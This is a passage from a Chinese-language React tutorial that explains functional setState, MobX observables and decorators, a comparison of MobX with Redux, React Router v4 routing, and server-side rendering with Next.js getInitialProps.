的第二个参数被调用时，React 已经处理完了任务列表，所以 this.state 就是更新后的数据。\n如果需要在 state 更新之后做点什么，请利用第二个参数。\n函数式 setState\n不管怎么说，setState 不能同步更新的确会带来一些麻烦，尤其是多个 setState 调用之间有依赖关系的时候，很容易写错代码。\n一个很典型的例子，当我们不断增加一个 state 的值时：\nthis.setState(&#123;count: this.state.count + 1&#125;);this.setState(&#123;count: this.state.count + 1&#125;);this.setState(&#123;count: this.state.count + 1&#125;);\n\n上面的代码表面上看会让 this.state.count 增加 3，实际上只增加了 1，因为 setState 没有同步更新 this.state 啊，所以给任务队列加的三个任务都是给 this.state.count 同一个值而已。\n面对这种情况，我们很自然地想到，如果任务列表中的任务不只是给 state 一个固定数据，如果任务列表里的“任务”是一个函数，能够根据当前 state 计算新的状态，那该多好！\n实际上，setState 已经支持这种功能，到现在为止我们给 setState 的第一个参数都是对象，其实也可以传入一个函数。\n当 setState 的第一个参数为函数时，任务列表上增加的就是一个可执行的任务函数了，React 每处理完一个任务，都会更新 this.state，然后把新的 state 传递给这个任务函数。\nsetState 第一个参数的形式如下：\nfunction increment(state, props) &#123;  return &#123;count: state.count + 1&#125;;&#125;\n\n可以看到，这是一个纯函数，不光接受当前的 state，还接受组件的 props，在这个函数中可以根据 state 和 props 任意计算，返回的结果会用于修改 this.state。\n如此一来，我们就可以这样连续调用 setState：\nthis.setState(increment);this.setState(increment);this.setState(increment);\n\n\n用这种函数式方式连续调用 setState，就真的能够让 this.state.count 增加 3，而不只是增加 1。\n\n5.2 Mobx 使用模式理解 Mobx\n\n虽然 Mobx 和 Redux 有很大不同，但是至少还有一个共同点——这两个工具都和 React 没有任何直接关系，只不过凑巧 React 社区大量使用它们罢了。从技术上说，Mobx 和 Redux 都是中立的状态管理工具，他们能够应用于 React，也可以用于其他需要状态管理的场景\n\n我们用 Mobx 来实现一个很简单的计数工具，首先，需要有一个对象来记录计数值，代码如下：\nimport &#123;observable&#125; from &#x27;mobx&#x27;;const counter = observable(&#123;  count: 0&#125;);\n\n在上面的代码中，counter 是一个对象，其实就是用 observable 函数包住一个普通 JavaScript 对象，但是 observable 的介入，让 counter 对象拥有了神力。\n我们用最简单的代码来展示这种“神力”，代码如下：\nimport &#123;autorun&#125; from &#x27;mobx&#x27;;window.counter = counter;autorun(() =&gt; &#123;  console.log(&#x27;#count&#x27;, counter.count);&#125;);\n\n把 counter 赋值给 window.counter，是为了让我们在 Chrome 的开发者界面可以访问。用 autorun 包住了一个函数，这个函数输出 counter.count 的值，这段代码的作用，我们很快就能看到。\n在 Chrome 的开发者界面，我们可以直接访问 window.counter.count，神奇之处是，如果我们直接修改 window.counter.count 的值，可以直接触发 autorun 的函数参数！\n\n这个现象说明，mobx 的 observable 拥有某种“神力”，任何对这个对象的修改，都会立刻引发某些函数被调用。和 observable 这个名字一样，被包装的对象变成了“被观察者”，而被调用的函数就是“观察者”，在上面的例子中，autorun 的函数参数就是“观察者”。\nMobx 这样的功能，等于实现了设计模式中的“观察者模式”（Observer Pattern），通过建立 observer 和 observable 之间的关联，达到数据联动。不过，传统的“观察者模式”要求我们写代码建立两者的关联，也就是写类似下面的代码：\nobservable.register(observer);\n\nMobx 最了不起之处，在于不需要开发者写上面的关联代码，Mobx自己通过解析代码就能够自动发现 observer 和 observable 之间的关系。\n我们很自然想到，如果让我们的数据拥有这样的“神力”，那我们就不用在修改完数据之后，再费心去调用某些函数使用这些数据了，数据管理会变得十分轻松。\ndecorator\n因为 Mobx 的作用就是把简单的对象赋予神力，总要有一种方法能够在不改变对象代码的前提，去改变对象的行为，这就用得上“装饰者模式”（Decorator Pattern）。\n单独说“装饰者模式”，这只是面向对象编程思想下的一种模式，不过对 JavaScript 语言而言，就不只是一种模式，而是一种语言特性，它在语法上对这种模式提供了强大的支持，所谓强大，就是指使用起来代码极其简洁。\n根据 JavaScript 语法，我们可以这样创造一个 decorator，叫做 log：\nfunction log(target, name, descriptor) &#123;  console.log(&#x27;#target&#x27;, target);  console.log(&#x27;#name&#x27;, name);  console.log(&#x27;#descriptor&#x27;, descriptor);  return descriptor;&#125;\n\n当然，很明显这个 decorator 什么实质的事情都没做，只是用 console.log 输出了三个参数秀了一下存在感，最后返回的 descriptor，就是被这个『装饰者』所『装饰』的对象。\n下面是使用这个 decorator 的代码示例：\n@logclass Bar &#123;  @log  bar() &#123;    console.log(&#x27;bar&#x27;);  &#125;&#125;\n\n可以看到，@ 符号就是使用 decorator 的标志，将 @log 作用于一个类 Bar，那么最后得到的 Bar 其实是调用 log 函数返回的结果；将 @log 作用于一个类成员 @bar，最后得到的 bar 同样是调用 log 函数之后得到的结果。可见，如果我们巧妙地编写 log 函数，控制返回的结果，就可以操纵被『装饰』的类或者成员。\n编写 decorator 是一个复杂的过程，也超出了这本小册的范围，有兴趣的读者可以自行研究。在这里，读者只需要知道，虽然使用 Mobx 并不是必须使用 decorator，但是使用 decorator 会让 Mobx 的应用代码简洁易读很多\n用 decorator 来使用 Mobx\n还是以 Counter 为例，看如何用 decorator 使用 Mobx，我们先看代码：\nimport &#123;observable&#125; from &#x27;mobx&#x27;;import &#123;observer&#125; from &#x27;mobx-react&#x27;;@observerclass Counter extends React.Component &#123;  @observable count = 0;  onIncrement = () =&gt; &#123;    this.count ++;  &#125;  onDecrement = () =&gt; &#123;    this.count --;  &#125;  componentWillUpdate() &#123;    console.log(&#x27;#enter componentWillUpdate&#x27;);  &#125;  render() &#123;    return(      &lt;CounterView        caption=&quot;With decorator&quot;        count=&#123;this.count&#125;        onIncrement=&#123;this.onIncrement&#125;        onDecrement=&#123;this.onDecrement&#125;        /&gt;    );  &#125;&#125;\n\n在上面的代码中，Counter 这个 React 组件自身是一个 observer，而 observable 是 Counter 的一个成员变量 count。\n注意 observer 这 个decorator 来自于 mobx-react，它是 Mobx 世界和 React 的桥梁，被它“装饰”的组件，只要用到某个被 Mobx 的 observable “装饰”过的数据，自然会对这样的数据产生反应。所以，只要 Counter 的 count 成员变量一变化，就会引发 Counter 组件的重新渲染。\n可以注意到，Counter 的代码中并没有自己的 state，其实，被 observer 修饰过之后，Counter 被强行”注入”了 state，只不过我们看不见而已。\n独立的 Store\n虽然把 observer 和 observable 集中在一个 React 组件中可行，但是，这也让 observable 的状态被封存在了 React 组件内，那我们直接用 React 自身的 state 管理也能解决问题，所以，这样使用 Mobx 意义不大。\n更多适用于 Mobx 的场合，就和适用于 Redux 的场合一样，是一个状态需要多个组件共享，所以 observable 一般是在 React 组件之外。\n我们重写一遍 Counter 组件，代码如下：\nconst store = observable(&#123;  count: 0&#125;);store.increment = function() &#123;  this.count ++;&#125;;store.decrement = function() &#123;  this.count --;&#125;@observer // this decorator is mustclass Counter extends React.Component &#123;  onIncrement = () =&gt; &#123;    store.increment();  &#125;  onDecrement = () =&gt; &#123;    store.decrement();  &#125;  render() &#123;    return(      &lt;CounterView        caption=&quot;With external state&quot;        count=&#123;store.count&#125;        onIncrement=&#123;this.onIncrement&#125;        onDecrement=&#123;this.onDecrement&#125;        /&gt;    );  &#125;&#125;\n\n\n可以看到，我们把 count 提到组件之外，甚至就把它叫做 store，这延续的是 Redux 的命名方法\n\n总结\n\nMobx 的基本功能就是“观察者模式”\ndecorator 是“装饰者模式”在 JavaScript 语言中的实现\nMobx 通常利用 decorator 来使用\n\n5.3 不同方式对比Mobx 和 Redux 的比较\nMobx 和 Redux 的目标都是管理好应用状态，但是最根本的区别在于对数据的处理方式不同。\nRedux 认为，数据的一致性很重要，为了保持数据的一致性，要求Store 中的数据尽量范式化，也就是减少一切不必要的冗余，为了限制对数据的修改，要求 Store 中数据是不可改的（Immutable），只能通过 action 触发 reducer 来更新 Store。\nMobx 也认为数据的一致性很重要，但是它认为解决问题的根本方法不是让数据范式化，而是不要给机会让数据变得不一致。所以，Mobx 鼓励数据干脆就“反范式化”，有冗余没问题，只要所有数据之间保持联动，改了一处，对应依赖这处的数据自动更新，那就不会发生数据不一致的问题。\n值得一提的是，虽然 Mobx 最初的一个卖点就是直接修改数据，但是实践中大家还是发现这样无组织无纪律不好，所以后来 Mobx 还是提供了 action 的概念。和 Redux 的 action 有点不同，Mobx 中的 action 其实就是一个函数，不需要做 dispatch，调用就修改对应数据，在上面的代码中，increment 和 decrement 就是 action。\n如果想强制要求使用 action，禁止直接修改 observable 数据，使用 Mobx 的 configure，如下：\nimport &#123;configure&#125; from &#x27;mobx&#x27;;configure(&#123;enforceActions: true&#125;);\n\n总结一下 Redux 和 Mobx 的区别，包括这些方面：\n\nRedux 鼓励一个应用只用一个 Store，Mobx 鼓励使用多个 Store；\nRedux 使用“拉”的方式使用数据，这一点和 React是一致的，但 Mobx 使用“推”的方式使用数据，和 RxJS 这样的工具走得更近；\nRedux 鼓励数据范式化，减少冗余，Mobx 容许数据冗余，但同样能保持数据一致。\n\n六、React Router随着 AJAX 技术的成熟，现在单页应用（Single Page Application）已经是前端网页界的标配，名为“单页”，其实在设计概念上依然是多页的界面，只不过从技术层面上页之间的切换是没有整体网页刷新的，只需要做局部更新。\n要实现“单页应用”，一个最要紧的问题就是做好“路由”（Routing)，也就是处理好下面两件事：\n\n把 URL 映射到对应的页面来处理；\n页面之间切换做到只需局部更新。\n\nreact router v4 的动态路由\n\n我们现在说到 react-router，基本上都是在说 react-router 的第 4 版，也就是 v4。这个 v4 很有意思，它完全推翻了之前 v3 的做法。可以说，react-router 的 v3 和 v4 版完完全全是不同的两个工具，两者差距实在太大。\n其实当初 v3 也已经很优秀很热门了，但是 react-router 的开发者不满意，他们认为 v3 还是落入了“静态路由”的窠臼，所以在 v4 中 react-router 做到了“动态路由”的功能。\n所谓“静态路由”，就是说路由规则是固定的，无论 express、Angular 还是 Rails 等业界响当当的框架，都用的是静态路由。以 express 为例，路由规则差不多是这么写的：\n\napp.get(&#x27;/&#x27;, Home);app.get(&#x27;/product/:id&#x27;, Product);app.get(&#x27;/about&#x27;, About);\n\n对于大部分应用，支持这样的路由规则真的是足够了，但是，react-router 的开发者觉得这样还不够好，要支持“动态路由”才是最好。\n所谓动态路由，指的是路由规则不是预先确定的，而是在渲染过程中确定的。因为 react-router 的定位就是专供 React 应用服务，而 React 的世界中一切皆为组件，所以 react-router v4 就完全用 React 组件来实现路由功能。\n不得不承认，虽然 react-router 的开发者是挺折腾的，但是他们的确是领悟了 React 的精髓，而且在 react-router 中把 React 的哲学发挥到了极致。\n接下来，我们通过一个很简单的例子来说明 react-router v4 如何工作的，然后在这个例子的基础上介绍“动态路由”。\nReact Router 实例\n安装包 react-router-dom\ncreate-react-app 产生的应用默认为不支持多个页面，但还是在 README 文件中友情推荐了一下 react-router 来增强功能，可见 react-router 影响力之大。\n不过，我们并不需要安装 react-router 这个 npm 包，因为 react-router 为了支持 Web 和 React Native 出了两个包—— react-router-dom 和 react-router-native ，我们只关心 Web，所以只需要安装 react-router-dom 。这个 react-router-dom 依赖于 react-router ，所以 react-router 也会被自动安装上\nnpm install react-router-dom\n\nHashRouter 还是 BrowserRouter\nreact-router 的工作方式，是在组件树顶层放一个 Router 组件，然后在组件树中散落着很多 Route 组件（注意比 Router 少一个“r”），顶层的 Router 组件负责分析监听 URL 的变化，在它保护伞之下的 Route 组件可以直接读取这些信息。\n很明显，Router 和 Route 的配合，就是之前我们介绍过的“提供者模式”，Router 是“提供者”，Route是“消费者”。\n更进一步，Router 其实也是一层抽象，让下面的 Route 无需各种不同 URL 设计的细节，不要以为 URL 就一种设计方法，至少可以分为两种。\n第一种很自然，比如 &#x2F; 对应 Home 页，&#x2F;about 对应 About 页，但是这样的设计需要服务器端渲染，因为用户可能直接访问任何一个 URL，服务器端必须能对 &#x2F;的访问返回 HTML，也要对 &#x2F;about 的访问返回 HTML。\n第二种看起来不自然，但是实现更简单。只有一个路径 &#x2F;，通过 URL 后面的 # 部分来决定路由，&#x2F;#&#x2F; 对应 Home 页，&#x2F;#&#x2F;about 对应 About 页。因为 URL 中#之后的部分是不会发送给服务器的，所以，无论哪个 URL，最后都是访问服务器的 &#x2F; 路径，服务器也只需要返回同样一份 HTML 就可以，然后由浏览器端解析 # 后的部分，完成浏览器端渲染。\n在 react-router，有 BrowserRouter 支持第一种 URL，有 HashRouter 支持第二种 URL。\n因为 create-react-app 产生的应用默认不支持服务器端渲染，为了简单起见，我们在下面的例子中使用 HashRouter，在实际产品中，其实最好还是用 BrowserRouter，这样用户体验更好。\n修改index.js文件，增加下面的代码：\nimport &#123;HashRouter&#125; from &#x27;react-router-dom&#x27;;ReactDOM.render(  &lt;HashRouter&gt;    &lt;App /&gt;  &lt;/HashRouter&gt;,  document.getElementById(&#x27;root&#x27;));\n\n把 Router 用在 React 组件树的最顶层，这是最佳实践。因为将来我们如果想把 HashRouter 换成 BrowserRouter，组件 App 以下几乎不用任何改变。\n使用 Link\n对于单页应用，需要在不同“页面”之间切换，往往需要一个“导航栏”，我们在这里也实现一个简单的导航栏。\n在App.js中，我们让网页由两个组件 Navigation 和 Content 组成， Navigation 就是导航栏，而 Content 是具体内容。\nclass App extends Component &#123;  render() &#123;    return (      &lt;div className=&quot;App&quot;&gt;        &lt;Navigation /&gt;        &lt;Content /&gt;      &lt;/div&gt;    );  &#125;&#125;\n\n\n我们计划只增加两个页面，在 Navigation 中就应该有两个链接，但是，如果我们简单使用 HTML 的 标签那就错了，用户点击 标签缺省行为是网页跳转，这违背了“单页应用”的原则。虽然对于 HashRouter 使用的是没有网页跳转的 #，但是为了将来可以无缝切换为 BrowserRouter ，我们也不能使用 [](#about) 这样的标签。\n正确的解法是用 react-router 提供的 Link 组件，虽然 Link 最终还是渲染为 标签，但这是有神力的 标签，用户点击时，react-router 可以知晓这是一个单页应用的链接，不用网页跳转只做局部页面更新。\n\nconst ulStyle = &#123;  &#x27;list-style-type&#x27;: &#x27;none&#x27;,  margin: 0,  padding: 0,&#125;;const liStyle = &#123;  display: &#x27;inline-block&#x27;,  width: &#x27;60px&#x27;,&#125;;const Navigation = () =&gt; (  &lt;header&gt;    &lt;nav&gt;      &lt;ul style=&#123;ulStyle&#125;&gt;        &lt;li style=&#123;liStyle&#125;&gt;&lt;Link to=&#x27;/&#x27;&gt;Home&lt;/Link&gt;&lt;/li&gt;        &lt;li style=&#123;liStyle&#125;&gt;&lt;Link to=&#x27;/about&#x27;&gt;About&lt;/Link&gt;&lt;/li&gt;      &lt;/ul&gt;    &lt;/nav&gt;  &lt;/header&gt;)\n\n使用 Route 和 Switch\n我们来看 Content 这个组件，这里会用到 react-router 最常用的两个组件 Route 和 Switch。\nconst Content = () =&gt; (  &lt;main&gt;    &lt;Switch&gt;      &lt;Route exact path=&#x27;/&#x27; component=&#123;Home&#125;/&gt;      &lt;Route path=&#x27;/about&#x27; component=&#123;About&#125;/&gt;    &lt;/Switch&gt;  &lt;/main&gt;)\n\nRoute 组件的 path 属性用于匹配路径，因为我们需要匹配 &#x2F; 到 Home，匹配 &#x2F;about 到 About，所以肯定需要两个 Route，但是，我们不能这么写。\n&lt;Route path=&#x27;/&#x27; component=&#123;Home&#125;/&gt;&lt;Route path=&#x27;/about&#x27; component=&#123;About&#125;/&gt;\n\n如果按照上面这么写，当访问 &#x2F;about 页面时，不光匹配 &#x2F;about，也配中 &#x2F;，界面上会把 Home 和 About 都渲染出来的。\n解决方法，可以在想要精确匹配的 Route 上加一个属性 exact，或者使用 Switch 组件。\n可以把 Switch 组件看做是 JavaScript 的 switch 语句，像这样：\nswitch (条件) &#123;  case 1: 渲染1; break;  case 2: 渲染2; break;&#125;\n\n从上往下找第一个匹配的 Route，匹配中了之后，立刻就 break，不继续这个 Switch 下其他的 Route 匹配了。\n可以看到，react-router 巧妙地用 React 组件实现了路由的所有逻辑，印证了那句话：React 世界里一切都是组件。\n动态路由\n在了解了 react-router的基本路由功能之后，再来理解“动态路由”就容易了。\n假设，我们增加一个新的页面叫 Product，对应路径为 &#x2F;product，但是只有用户登录了之后才显示。如果用静态路由，我们在渲染之前就确定这条路由规则，这样即使用户没有登录，也可以访问 product，我们还不得不在 Product 组件中做用户是否登录的检查。\n如果用动态路由，则只需要在代码中的一处涉及这个逻辑：\n&lt;Switch&gt;  &lt;Route exact path=&#x27;/&#x27; component=&#123;Home&#125;/&gt;  &#123;    isUserLogin() &amp;&amp;    &lt;Route exact path=&#x27;/product&#x27; component=&#123;Product&#125;/&gt;,  &#125;    &lt;Route path=&#x27;/about&#x27; component=&#123;About&#125;/&gt;&lt;/Switch&gt;\n\n\n可以用任何条件决定 Route 组件实例是否渲染，比如，可以根据页面宽度、设备类型决定路由规则，动态路由有了最大的自由度\n\n七、服务器端渲染7.1 基本套路为什么要服务器端渲染\n最近几年浏览器端框架很繁荣，以至于很多新入行的开发者只知道浏览器端渲染框架，都不知道存在服务器端渲染这回事，其实，网站应用最初全都是服务器端渲染，由服务器端用 PHP、Java 或者 Python 等其他语言产生 HTML 来给浏览器端解析。\n相比于浏览器端渲染，服务器端渲染的好处是：\n1、可以缩短“第一有意义渲染时间”（First-Meaningful-Paint-Time）。\n如果完全依赖于浏览器端渲染，那么服务器端返回的 HTML 就是一个空荡荡的框架和对 JavaScript 的应用，然后浏览器下载 JavaScript，再根据 JavaScript 中的 AJAX 调用获取服务器端数据，再渲染出 DOM 来填充网页内容，总共需要三个 HTTP 或 HTTPS 请求。\n如果使用服务器端渲染，第一个 HTTP&#x2F;HTTPS 请求返回的 HTML 里就包含可以渲染的内容了，这样用户第一时间就会感觉到“有东西画出来了”，这样的感知性能更好。\n2、更好的搜索引擎优化（Search-Engine-Optimization，SEO）\n大部分网站都希望自己能够出现在搜索引擎的搜索页前列，这个前提就是网页内容要能够被搜索引擎的爬虫正确抓取到。虽然 Google 这样的搜索引擎已经可以检索浏览器端渲染的网页，但毕竟不是全部搜索引擎都能做到，如果搜索引擎的爬虫只能拿到服务器端渲染的内容，完全浏览器端渲染就行不通了。\n即使对于 Google，网页性能也是搜索排名的重要指标，如果通过服务器端渲染提高网页性能，网页的排名更可能靠前。\n上面两点，就是服务器端渲染的主要意义。\nReact 对服务器端渲染的支持\n因为 React 是声明式框架，所以，在渲染上对服务器端渲染非常友好。\n假设我们我们要渲染一个以 App 为最根节点的组件树，浏览器端渲染的代码如下：\nimport React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;));\n\n现在我们想要在服务器端渲染 App，如果使用 React v16 之前的版本，代码是这样：\nimport React from &#x27;react&#x27;;import ReactDOMServer from &#x27;react-dom/server&#x27;;// 把产生html返回给浏览器端const html = ReactDOMServer.renderToString(&lt;Hello /&gt;);\n\n从 React v16 开始，上面的服务器端代码依然可以使用，但是也可以把 renderToString 替换为 renderToNodeStream，代码如下：\nimport React from &#x27;react&#x27;;import ReactDOMServer from &#x27;react-dom/server&#x27;;// 把渲染内容以流的形式塞给responseReactDOMServer.renderToNodeStream(&lt;Hello /&gt;).pipe(response);\n\n此外，浏览器端代码也有一点变化，ReactDOM.render 依然可以使用，但是官方建议替换为 ReactDOM.hydrate，原来的 ReactDOM.render 将来会被废弃掉。\nrenderToString 的功能是一口气同步产生最终 HTML，如果 React 组件树很庞大，这样一个同步过程可能比较耗时。假设渲染完整 HTML 需要 500 毫秒，那么一个 HTTP&#x2F;HTTPS 请求过来，500 毫秒之后才返回 HTML，显得不大合适，这也是为什么 v16 提供了 renderToNodeStream 这个新 API 的原因。\nrenderToNodeStream 把渲染结果以“流”的形式塞给 response 对象（这里的 response 是 express 或者 koa 的概念），这意味着不用等到所有 HTML 都渲染出来了才给浏览器端返回结果，也许 10 毫秒内就渲染出来了网页头部，那就没必要等到 500 毫秒全部网页都出来了才推给浏览器，“流”的作用就是有多少内容给多少内容，这样用户只需要 10 毫秒多一点的延迟就可以看到网页内容，进一步改进了“第一有意义渲染时间”\n服务器端渲染的难点\n看到这里，你可能觉得服务器端渲染也太简单了，的确，因为 React 组件可以不必关心自己是在哪个端渲染，可以做到代码一次编写，到处都可以执行。但是，真的这么简单吗？\n为了简化问题，上面的代码示例有意忽略了一个事实，那就是，应用往往需要外部服务器获取数据啊！\n除非你的网页应用根本没有动态内容，不然你必须要考虑在服务器端怎么给 React 组件获取数据。\n比如，你现在看到的掘金小册，为了渲染你所看到的页面，需要调用掘金小册的服务器 API 来获取这篇文章的内容。对于浏览器端渲染，在 componentDidMount 里调用 AJAX 就好了；对于服务器端渲染，要想产生 HTML 的包含内容，必须事先把数据准备好，也就是说，代码要是这样才行：\nimport React from &#x27;react&#x27;;import ReactDOMServer from &#x27;react-dom/server&#x27;;callAPI().then(result =&gt; &#123;  const props = result;  ReactDOMServer.renderToNodeStream(&lt;Hello &#123;...props&#125;/&gt;).pipe(response);&#125;);\n\n最大的问题来了，如何给组件获取和提供数据呢？\n解决了这个问题，才算真的解决了服务器端渲染的问题。\n“脱水”和“注水”8\nReact 有一个特点，就是把内容展示和动态功能集中在一个组件中。比如，一个 Counter 组件既负责怎么画出内容，也要负责怎么响应按键点击，这当然符合软件高内聚性的原则，但是也给服务器端渲染带来更多的工作。\n设想一下，如果只使用服务器端渲染，那么产生的只有 HTML，虽然能够让浏览器端画出内容，但是，没有 JavaScript 的辅助是无法响应用户交互事件的。对应 Counter 的例子，一个 Counter 组件在浏览器中也就渲染出一个数字两个按钮，用户点击 + 按钮或者 - 按钮，什么都不会发生。\n很显然我们必须要在浏览器端赋予 Counter 组件一些“神力”，让它能够响应事件。那么怎么赋予 Counter 组件“神力”呢？其实我们已经做过这件事了，Counter 组件里面已经有对按钮事件的处理，我们所要做的只是让 Counter 组件在浏览器端重新执行一遍，也就是 mount 一遍就可以了。\n\n也就是说，如果想要动态交互效果，使用 React 服务器端渲染，必须也配合使用浏览器端渲染。\n\n现在问题变得更加有趣了，在服务器端我们给 Counter 一个初始值（这个值可以不是缺省的 0），让 Counter 渲染产生 HTML，这些 HTML 要传递给浏览器端，为了让 Counter 的 HTML“活”起来点击相应事件，必须要在浏览器端重新渲染一遍 Counter 组件。在浏览器端渲染 Counter 之前，用户就可以看见 Counter 组件的内容，但是无法点击交互，要想点击交互，就必须要等到浏览器端也渲染一次 Counter 之后。\n接下来的一个问题，如果服务器端塞给 Counter 的数据和浏览器端塞给 Counter 的数据不一样呢？\n在 React v16 之前，React 在浏览器端渲染之后，会把内容和服务器端给的 HTML 做一个比对。如果完全一样，那最好，接着用服务器端 HTML 就好了；如果有一丁点不一样，就会立刻丢掉服务器端的 HTML，重新渲染浏览器端产生的内容，结果就是用户可以看到界面闪烁。因为 React 抛弃的是整个服务器端渲染内容，组件树越大，这个闪烁效果越明显。\nReact 在 v16 之后，做了一些改进，不再要求整个组件树两端渲染结果分毫不差，但是如果发生不一致，依然会抛弃局部服务器端渲染结果。\n\n总之，如果用服务器端渲染，一定要让服务器端塞给 React 组件的数据和浏览器端一致。\n\n为了达到这一目的，必须把传给 React 组件的数据给保留住，随着 HTML 一起传递给浏览器网页，这个过程，叫做“脱水”（Dehydrate）；在浏览器端，就直接拿这个“脱水”数据来初始化 React 组件，这个过程叫“注水”（Hydrate）。\n前面提到过 React v16 之后用 React.hydrate 替换 React.render，这个 hydrate 就是“注水”。\n\n\n总之，为了实现React的服务器端渲染，必须要处理好这两个问题：\n\n\n脱水\n注水\n\nFacebook 未使用服务器端渲染\n值得一提的是，虽然 React 从最初版本就支持“服务器端渲染”，并且 React 的创建者 Facebook 也全力在自己的网站产品中使用 React，但他们自己却没有使用 React 的服务器端渲染功能。理由是，Facebook 已经在 PHP 上投入了很多资源，不打算放弃这些投入。\n这里我当然不是批评 Facebook，实际上，Facebook 对 React 的支持是真心的，它在自己的网站上大范围使用 React，而不只是做出来后让外部使用者当小白鼠，这种全力投入也给了 React 使用者很大信心。但另一方面，因为 Facebook 自己不用 React 的服务器端渲染，如何利用这个功能，就缺乏一个官方参考标准了。\n也许就是因为缺乏 Facebook 的官方标准，业界对服务器端渲染的解决方法层出不穷，不过，到目前看来，next.js 还是最佳方案\n7.2 理解 Next.js我们已经知道了服务器端渲染的原理，你只需要搭建一个 Express 服务器，在服务器端手工打造『脱水』，在浏览器端做『注水』，完成某个页面的服务器端渲染并不难。\n不过，服务器端渲染的问题并不这么简单，一个最直接的问题，就是怎么处理多个页面的『单页应用』（Single-Page-Application）？\n所以单页应用，就是虽然用户感觉有多个页面，但是实现上只有一个页面，用户感觉到页面可以来回切换，但其实只是一个页面并没有完全刷新，只是局部界面更新而已。\n假设一个单页应用有三个页面 Home、Prodcut 和 About，分别对应的的路径是 &#x2F;home、&#x2F;product 和 &#x2F;about，而且三个页面都依赖于 API 调用来获取外部数据。\n现在我们要做服务器端渲染，如果只考虑用户直接在地址栏输入 &#x2F;home、&#x2F;product 和 &#x2F;about 的场景，很容易满足，按照上面说的套路做就是了。但是，这是一个单页应用，用户可以在 Home 页面点击链接无缝切换到 Product，这时候 Product 要做完全的浏览器端渲染。换句话说，每个页面都需要既支持服务器端渲染，又支持完全的浏览器端渲染，更重要的是，对于开发者来说，肯定不希望为了这个页面实现两套程序，所以必须有同时满足服务器端渲染和浏览器端渲染的代码表示方式。\n读者可以思考一下什么样的代码表示合适，也可以直接往下，看看业界公认最科学的实现方式 Next.js 是如何做的。\n快速创建 Next.js 项目\n在说明 Next.js 的工作原理之前，我们先看怎么快速创建 Next.js 项目，这个问题用代码来说明会更顺畅。\n我们也可以手工创建 Next.js 项目，不过更简单的方式是用自动化工具 create-next-app，这个 create-next-app 类似于 create-react-app，一个命令就创建一个可以运行的应用。\n首先安装 create-next-app。\nnpm install -g create-next-app\n\n然后，就可以在你专门存放项目的目录下执行 create-next-app，产生一个使用 Next.js 的 React 应用，下面的命令创建一个叫 next_demo 的应用：\ncreate-next-app next_demo\n\n进入新生成的项目目录 next_demo 里检查一下，可以看到文件结构非常简洁，pages 目录下是页面文件，package.json 中差不是下面这样，没有繁冗的 webpack 和 babel 依赖包，因为一切都被 Next.js 封装起来了\n&#123;  &quot;name&quot;: &quot;create-next-example-app&quot;,  &quot;scripts&quot;: &#123;    &quot;dev&quot;: &quot;next&quot;,    &quot;build&quot;: &quot;next build&quot;,    &quot;start&quot;: &quot;next start&quot;  &#125;,  &quot;dependencies&quot;: &#123;    &quot;next&quot;: &quot;^6.0.3&quot;,    &quot;react&quot;: &quot;^16.5.2&quot;,    &quot;react-dom&quot;: &quot;^16.5.2&quot;  &#125;&#125;\n\n虽然有不少框架都表示自己的功能很强大，但其中有很多框架的设计并不中立，用这些框架去开发某些特定应用或许还行，如果放到一个更大范围的应用类型中，就会发现无法满足要求，这样的框架通用性不足，开发者一定要谨慎使用。\n讲良心话，Next.js 真的是一个通用性非常高的框架，因为 Next.js 完全遵从了 React 的技术哲学：一切皆为组件。\n在 Next.js 中，创造一个页面，其实就是创造一个 React 组件，接下来我们看看如何创建一个页面。\n编写页面\n使用下面的命令启动 Next.js 应用，进入的是开发者模式，这时候对代码的改变，会立刻体现在网页上。\nnpm run dev\n\n请注意，这一点上 Next.js 的习惯用法和 create-react-app 产生的应用不一样。在 create-react-app 产生的应用中， npm run start 启动是开发者模式，但在 Next.js 应用中，习惯上 npm run start 以产品模式启动，所以要先运行 npm run build 然后才能运行 npm run start。\nNext.js 遵从『协定优于配置』（convention over configuration）的设计原则，根据『协定』，在 pages 中每个文件对应一个网页文件，文件名对应的就是网页的路径名，比如 pages&#x2F;home.js 文件对应的就是 &#x2F;home 路径的页面，当然 pages&#x2F;index.js 比较特殊，对应的是默认根路径 &#x2F; 的页面。\n我们修改 pages&#x2F;index.js，让它更简单一些，如下：\nimport React from &#x27;react&#x27;const Home = (props) =&gt; (  &lt;h1&gt;    Hello World  &lt;/h1&gt;)export default Home\n\n这样会在页面上显示出一个 Hello World，而这个页面代码就是一个普通的 React 组件而已。\n页面都是 React 组件，这就是 Next.js 的哲学。\ngetInitialProps\n我们还是要回到本来的话题，如何优雅地实现服务器端渲染，上面的 Home 页面虽然能够渲染出完整包含 Hello World 的 HTML，但是并没有调用任何外部 API 资源，所以也没有异步操作，并不能体现服务器端渲染的难度。\n我们用一个函数来实现异步操作，以此模拟调用 API 的延迟效果，如下：\nconst timeout = (ms, result) =&gt; &#123;  return new Promise(resolve =&gt; setTimeout(() =&gt; resolve(result), ms));&#125;;\n\n\n然后，我们利用这个 timeout 来获得展示网页所需的数据。比如说，获取用户名，那么我们的 Home 组件就要换一个写法，像下面那样，增加 getInitialProps 的定义：\n\nconst Home = (props) =&gt; (  &lt;h1&gt;    Hello &#123;props.userName&#125;  &lt;/h1&gt;)Home.getInitialProps = async () =&gt; &#123;  return await timeout(200, &#123;userName: &#x27;Morgan&#x27;&#125;);&#125;;\n\n这个 getiInitialProps 是 Next.js 最伟大的发明，它确定了一个规范，一个页面组件只要把访问 API 外部资源的代码放在 getInitialProps 中就足够，其余的不用管，Next.js 自然会在服务器端或者浏览器端调用 getInitialProps 来获取外部资源，并把外部资源以 props 的方式传递给页面组件。\n注意 getInitialProps 是页面组件的静态成员函数，可以用下面的方法定义：\nHome.getInitialProps = async () = &#123;...&#125;;\n\n也可以在组件类中加上 static 关键字定义：\nclass Home extends React.Component &#123;  static async getInitialProps() &#123;     ...  &#125;&#125;\n\n通过上面的代码，我么也可以注意到，getInitialProps 是一个 async 函数，所以，在 getInitialProps 函数中可以使用 await 关键字，用同步的方式编写异步逻辑。\n我们可以这样来看待 getInitialProps，它就是 Next.js 对代表页面的 React 组件生命周期的扩充。React 组件的生命周期函数缺乏对异步操作的支持，所以 Next.js 干脆定义出一个新的生命周期函数 getInitialProps，在调用 React 原生的所有生命周期函数之前，Next.js 会调用 getInitialProps 来获取数据，然后把获得数据作为 props 来启动 React 组件的原生生命周期过程。\n这个生命周期函数的扩充十分巧妙，因为：\n\n没有侵入 React 原生生命周期函数，以前的 